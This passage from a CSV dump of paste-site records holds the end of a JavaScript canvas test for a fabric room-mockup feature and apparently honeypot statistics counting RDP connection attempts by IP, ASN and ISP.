id,title,username,language,date,content
    ctx.fillStyle = ""red"";
    ctx.fillRect(0, 0, 600, 450);
    
    ctx.fillStyle = ""white"";
    ctx.font = ""48px Arial"";
    ctx.fillText(""FABRIC TEST"", 150, 250);
    
    const roomMockup = document.getElementById('roomMockup') || dom?.roomMockup;
    if (roomMockup) {
        roomMockup.src = canvas.toDataURL();
        console.log(""🔴 Red canvas set to roomMockup"");
    } else {
        console.error(""❌ No roomMockup element found"");
    }
};

// Simple fabric function that just fits a 3840x2160 image into 600x450
window.simpleFabricTest = function() {
    console.log(""🧵 SIMPLE FABRIC TEST"");
    
    const canvas = document.createElement(""canvas"");
    const ctx = canvas.getContext(""2d"");
    canvas.width = 600;
    canvas.height = 450;
    
    // Fill with a color first
    ctx.fillStyle = ""#F0F0E9"";
    ctx.fillRect(0, 0, 600, 450);
    
    const img = new Image();
    img.crossOrigin = ""anonymous"";
    img.onload = function() {
        console.log(`Image loaded: ${img.width}x${img.height}`);
        
        // Calculate scale to fit 3840x2160 into 600x450
        const scaleX = 600 / img.width;
        const scaleY = 450 / img.height;
        const scale = Math.min(scaleX, scaleY);
        
        console.log(`Scale: ${scale} (${scaleX}, ${scaleY})`);
        
        const w = img.width * scale;
        const h = img.height * scale;
        const x = (600 - w) / 2;
        const y = (450 - h) / 2;
        
        console.log(`Drawing at: ${x}, ${y}, ${w}x${h}`);
        
        ctx.drawImage(img, x, y, w, h);
        
        // Update display
        const roomMockup = document.getElementById('roomMockup');
        if (roomMockup) {
            roomMockup.src = canvas.toDataURL();
            console.log(""✅ Simple fabric test complete"");
        }
    };
    
    img.src = ""https://so-animation.com/colorflex/data/fabric/fabric-base.png"";
};
window.addBackToPatternsButton = addBackToPatternsButton;
window.initializeTryFurnitureFeature = initializeTryFurnitureFeature;"
w5Chw2Va,2025-07-19_stats.json,rdp_snitch,JSON,Saturday 19th of July 2025 07:18:12 PM CDT,"{
  ""ip"": {
    ""68.183.178.139"": 3,
    ""194.165.16.167"": 6,
    ""35.203.210.10"": 12,
    ""194.165.16.162"": 6,
    ""185.196.220.41"": 9,
    ""164.92.192.11"": 1590,
    ""198.235.24.66"": 9,
    ""141.98.11.124"": 12,
    ""2.57.121.247"": 9,
    ""194.180.49.127"": 3,
    ""167.71.183.1"": 9,
    ""198.235.24.219"": 9,
    ""85.215.227.124"": 3,
    ""80.94.95.75"": 15,
    ""162.142.125.117"": 3,
    ""188.166.231.132"": 9,
    ""199.45.155.67"": 3,
    ""191.252.2.116"": 9,
    ""147.185.132.192"": 9,
    ""201.6.156.230"": 3,
    ""181.30.42.98"": 3,
    ""181.15.102.103"": 3,
    ""43.133.180.36"": 3,
    ""205.210.31.46"": 9,
    ""91.238.181.96"": 6
  },
  ""asn"": {
    ""AS14061"": 1611,
    ""AS48721"": 12,
    ""AS396982"": 48,
    ""AS213438"": 9,
    ""AS209605"": 12,
    ""AS47890"": 9,
    ""AS201814"": 3,
    ""AS8560"": 3,
    ""AS204428"": 15,
    ""AS398324"": 3,
    ""AS398722"": 3,
    ""AS27715"": 9,
    ""AS28573"": 3,
    ""AS7303"": 6,
    ""AS132203"": 3,
    ""AS49434"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1611,
    ""Flyservers S.A."": 12,
    ""Google LLC"": 48,
    ""ColocaTel Inc."": 9,
    ""UAB Host Baltic"": 12,
    ""Unmanaged LTD"": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""IONOS SE"": 3,
    ""SS-Net"": 15,
    ""Censys, Inc."": 6,
    ""Locaweb Servi\u00e7os de Internet S/A"": 9,
    ""Claro NXT Telecomunicacoes Ltda"": 3,
    ""Telecom Argentina S.A"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Datacenter location PAR1 France"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1602,
    ""Flyservers S.A"": 12,
    ""Google Cloud (europe-west2)"": 12,
    ""Colocatel Inc"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Unknown"": 12,
    ""Unmanaged LTD"": 24,
    ""HostSlick"": 3,
    ""Strato AG"": 3,
    ""Censys Inc"": 3,
    ""Digitalocean"": 9,
    ""Censys, Inc."": 3,
    ""Locaweb Servi\u00e7os de Internet S/A"": 9,
    ""Claro NXT Telecomunicacoes Ltda"": 3,
    ""Fibertel"": 3,
    ""Telecom Business"": 3,
    ""Tencent Cloud Computing"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6
